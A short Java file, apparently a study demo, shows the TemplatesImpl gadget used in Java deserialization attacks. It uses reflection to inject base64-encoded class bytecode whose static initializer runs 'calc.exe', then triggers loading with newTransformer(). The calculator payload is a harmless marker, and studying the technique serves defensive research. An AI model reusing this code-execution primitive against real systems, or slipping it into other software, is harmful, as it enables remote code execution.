package org.example.load;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class HelloTemplatesImpl {
    public static void main(String[] args) throws TransformerConfigurationException {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAMQoADAAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEKAAkAIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACABAApTb3VyY2VGaWxlAQAQQ2FsY0V4YW1wbGUuamF2YQwADQAOBwAlDAAmACcBAAxDYWxjIEV4YW1wbGUHACgMACkAKgcAKwwALAAtAQAIY2FsYy5leGUMAC4ALwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwADQAwAQALQ2FsY0V4YW1wbGUBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAsADAAAAAAAAgABAA0ADgABAA8AAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAQAAAADgADAAAACwAEAAwADAANAAgAEQAOAAEADwAAAFQAAwABAAAAF7gABRIGtgAHS6cADUu7AAlZKrcACr+xAAEAAAAJAAwACAACABAAAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgASAAAABwACTAcAEwkAAQAUAAAAAgAV");
                        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }

    private static void setFieldValue(Object obj, String propertyName, Object value) {
        try {
            // 获取对象的类
            Class<?> clazz = obj.getClass();
            // 获取指定名称的属性
            Field field = clazz.getDeclaredField(propertyName);
            // 设置属性的访问权限
            field.setAccessible(true);
            // 设置属性值
            field.set(obj, value);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
